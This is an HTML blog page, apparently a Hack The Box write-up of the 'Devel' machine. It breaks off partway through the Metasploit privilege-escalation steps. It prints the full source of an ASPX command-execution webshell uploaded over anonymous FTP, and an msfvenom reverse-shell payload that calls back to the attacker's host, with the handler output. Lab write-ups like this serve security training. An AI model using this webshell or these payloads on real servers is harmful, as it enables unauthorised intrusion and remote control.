@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Devel (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Devel from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/devel/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Devel (Easy)">
+<meta property="og:description" content="Writeup of Devel from Hack The Box." />
+<meta property="og:url" content="/posts/devel/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-18 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/devel/">HTB Writeup - Devel (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-18</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/windows/">windows</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Devel</code> machine is an easy linux box.</p>
+<p><img src="/images/Devel.png#center" alt="Scenario 1: Across columns"></p>
+<h3 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -A -sC -sV 10.10.10.5  
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-07-18 14:11 EDT
+</span></span><span style="display:flex;"><span>Stats: 0:00:16 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 14:11 <span style="color:#f92672">(</span>0:00:06 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     Microsoft ftpd
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+</span></span><span style="display:flex;"><span>| 07-18-23  09:04PM       &lt;DIR&gt;          files
+</span></span><span style="display:flex;"><span>| 03-17-17  05:37PM                  <span style="color:#ae81ff">689</span> iisstart.htm
+</span></span><span style="display:flex;"><span>| 07-18-23  12:56PM                 <span style="color:#ae81ff">2774</span> shell.aspx
+</span></span><span style="display:flex;"><span>|_03-17-17  05:37PM               <span style="color:#ae81ff">184946</span> welcome.png
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: IIS7
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.32 seconds
+</span></span></code></pre></div><h3 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I connect to <code>ftp</code> with Anonymous login <code>Anonymous:Anonymous</code>, and I download this file <code>iisstart.htm</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.10.10.5
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.5.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.10.5:kali<span style="color:#f92672">)</span>: Anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49159|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+</span></span><span style="display:flex;"><span>03-17-17  05:37PM                  <span style="color:#ae81ff">689</span> iisstart.htm
+</span></span><span style="display:flex;"><span>03-17-17  05:37PM               <span style="color:#ae81ff">184946</span> welcome.png
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; get iisstart.htm
+</span></span><span style="display:flex;"><span>local: iisstart.htm remote: iisstart.htm
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49160|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening ASCII mode data connection.
+</span></span><span style="display:flex;"><span>100% |********************************************************************************************************************************************************************************************|   <span style="color:#ae81ff">689</span>        5.86 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">689</span> bytes received in 00:00 <span style="color:#f92672">(</span>5.85 KiB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I try to load a file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ftp&gt; put 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>local-file<span style="color:#f92672">)</span> file.txt  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>remote-file<span style="color:#f92672">)</span> file.txt  
+</span></span><span style="display:flex;"><span>local: file.txt remote: file.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49166|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |********************************************************************************************************************************************************************************************|   <span style="color:#ae81ff">613</span> KiB  783.42 KiB/s    --:-- ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">628554</span> bytes sent in 00:01 <span style="color:#f92672">(</span>599.53 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><p>I have see this directory  <code>aspnet_client</code> thereby I can load and <code>execute</code> a reverse shell with <code>aspx</code> extension:</p>
+<ul>
+<li>Reverse Shell:</li>
+</ul>
+<pre tabindex="0"><code class="language-aspx" data-lang="aspx">&lt;%@ Page Language=&#34;C#&#34; Debug=&#34;true&#34; Trace=&#34;false&#34; %&gt;
+&lt;%@ Import Namespace=&#34;System.Diagnostics&#34; %&gt;
+&lt;%@ Import Namespace=&#34;System.IO&#34; %&gt;
+&lt;script Language=&#34;c#&#34; runat=&#34;server&#34;&gt;
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = &#34;cmd.exe&#34;;
+psi.Arguments = &#34;/c &#34;+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write(&#34;&lt;pre&gt;&#34;);
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write(&#34;&lt;/pre&gt;&#34;);
+}
+&lt;/script&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;title&gt;awen asp.net webshell&lt;/title&gt;
+&lt;/HEAD&gt;
+&lt;body &gt;
+&lt;form id=&#34;cmd&#34; method=&#34;post&#34; runat=&#34;server&#34;&gt;
+&lt;asp:TextBox id=&#34;txtArg&#34; style=&#34;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&#34; runat=&#34;server&#34; Width=&#34;250px&#34;&gt;&lt;/asp:TextBox&gt;
+&lt;asp:Button id=&#34;testing&#34; style=&#34;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&#34; runat=&#34;server&#34; Text=&#34;excute&#34; OnClick=&#34;cmdExe_Click&#34;&gt;&lt;/asp:Button&gt;
+&lt;asp:Label id=&#34;lblText&#34; style=&#34;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&#34; runat=&#34;server&#34;&gt;Command:&lt;/asp:Label&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/HTML&gt;
+
+&lt;!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --&gt;
+&lt;!--    http://michaeldaw.org   04/2007    --&gt;
+</code></pre><p>I load the reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ftp&gt; put cmdasp.aspx
+</span></span><span style="display:flex;"><span>local: cmdasp.aspx remote: cmdasp.aspx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49173|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |********************************************************************************************************************************************************************************************|  <span style="color:#ae81ff">1442</span>        8.87 MiB/s    --:-- ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1442</span> bytes sent in 00:00 <span style="color:#f92672">(</span>12.10 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="http">HTTP<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I can go in this page http://10.10.10.5/cmdasp.aspx, I digit <code>whoami</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /cmdasp.aspx <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.5</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">177</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.5</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.5/cmdasp.aspx</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZLy9q6WrElDiXrcKvS9uoRoeiI2y&amp;__EVENTVALIDATION=%2FwEWAwLd3a6aBAKa%2B%2BKPCgKBwth5U5mFK%2FzdvqmQKHdW9p8AojEQAZo%3D&amp;txtArg=whoami&amp;testing=excute
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">private</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Microsoft-IIS/7.5</span>
+</span></span><span style="display:flex;"><span>X-AspNet-Version<span style="color:#f92672">:</span> <span style="color:#ae81ff">2.0.50727</span>
+</span></span><span style="display:flex;"><span>X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">ASP.NET</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 18 Jul 2023 18:59:39 GMT</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">992</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;iis apppool\web
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">pre</span>&gt;
+</span></span></code></pre></div><p>I check my privileges:</p>
+<ul>
+<li>Request</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /cmdasp.aspx <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.5</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">177</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.5</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.5/cmdasp.aspx</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZLy9q6WrElDiXrcKvS9uoRoeiI2y&amp;__EVENTVALIDATION=%2FwEWAwLd3a6aBAKa%2B%2BKPCgKBwth5U5mFK%2FzdvqmQKHdW9p8AojEQAZo%3D&amp;txtArg=whoami+/priv&amp;testing=excute
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">private</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Microsoft-IIS/7.5</span>
+</span></span><span style="display:flex;"><span>X-AspNet-Version<span style="color:#f92672">:</span> <span style="color:#ae81ff">2.0.50727</span>
+</span></span><span style="display:flex;"><span>X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">ASP.NET</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 18 Jul 2023 19:03:08 GMT</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">2017</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
+</span></span><span style="display:flex;"><span>============================= ========================================= ========
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system                      Disabled
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span></span><span style="display:flex;"><span>SeUndockPrivilege             Remove computer from docking station      Disabled
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled 
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></span><span style="display:flex;"><span>SeTimeZonePrivilege           Change the time zone                      Disabled
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I create a reverse shell with <code>msfvenom</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.104 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> -f aspx &gt; backdoor.aspx 
+</span></span></code></pre></div><p>I load this reverse shell on the web server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.10.10.5
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.5.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.10.5:kali<span style="color:#f92672">)</span>: Anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span><span style="display:flex;"><span>ftp&gt; put backdoor.aspx
+</span></span><span style="display:flex;"><span>local: backdoor.aspx remote: backdoor.aspx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49344|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************|  <span style="color:#ae81ff">2930</span>       14.25 MiB/s    --:-- ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2930</span> bytes sent in 00:00 <span style="color:#f92672">(</span>24.90 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><p>I set the Listener with <code>metasploit</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf6&gt; use /multi/handler
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lport <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 10.10.14.104
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 10.10.14.104
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.104:1234 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 10.10.10.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.104:1234 -&gt; 10.10.10.5:49345<span style="color:#f92672">)</span> at 2023-07-18 15:30:40 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span></code></pre></div><p>I exit to this session and I use <code>post/multi/recon/local_exploit_suggester</code> module to have list all vulnerabilities on  this machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>meterpreter &gt; background
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 2...
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; search suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                      ---------------  ----    -----  -----------
